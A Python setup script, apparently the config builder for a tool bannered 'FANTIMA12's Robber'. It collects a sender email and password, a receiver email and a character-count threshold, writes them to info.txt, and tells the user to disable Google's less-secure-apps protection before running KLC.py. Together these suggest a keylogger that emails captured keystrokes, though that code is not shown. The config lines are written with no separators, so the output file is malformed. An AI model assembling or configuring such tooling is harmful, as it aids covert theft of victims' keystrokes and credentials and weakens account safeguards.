#You can also go to 'https://patorjk.com/software/taag/' for creating your banner
print('''
______ ___   _   _ ________  ___  ___   __   _____   _     
|  ___/ _ \ | \ | |_   _|  \/  | / _ \ /  | / __  \ ( )    
| |_ / /_\ \|  \| | | | | .  . |/ /_\ \`| | `' / /' |/ ___ 
|  _||  _  || . ` | | | | |\/| ||  _  | | |   / /     / __|
| |  | | | || |\  |_| |_| |  | || | | |_| |_./ /___   \__ \\
\_|  \_| |_/\_| \_/\___/\_|  |_/\_| |_/\___/\_____/   |___/                                                                                                                   
______      _     _                                       
| ___ \    | |   | |                                      
| |_/ /___ | |__ | |__   ___ _ __                         
|    // _ \| '_ \| '_ \ / _ \ '__|                        
| |\ \ (_) | |_) | |_) |  __/ |                           
\_| \_\___/|_.__/|_.__/ \___|_|                                                                                                                     
''')
sender_email=input("Sender_Email : ")
sender_pass=input("Sender_Pass : ")
receiver_email=input("Receiver_Email : ")
email_char_count=input("Email_Send_Char_Count : ")
with open('info.txt','w+') as file:
    file.write("sender_email="+"\""+sender_email+"\"")
    file.write("sender_pass="+"\""+sender_pass+"\"")
    file.write("receiver_email="+"\""+receiver_email+"\"")
    file.write("email_char_count="+email_char_count)
print("\nDone.\n")
print("You Also Need To Turn Off Your 'Access to less secure applications' Option In Your Sender_Email Account.")
print("You Can Find The Option In 'https://myaccount.google.com/security'")
print("\n.You Should Use KLC.py Now.\n")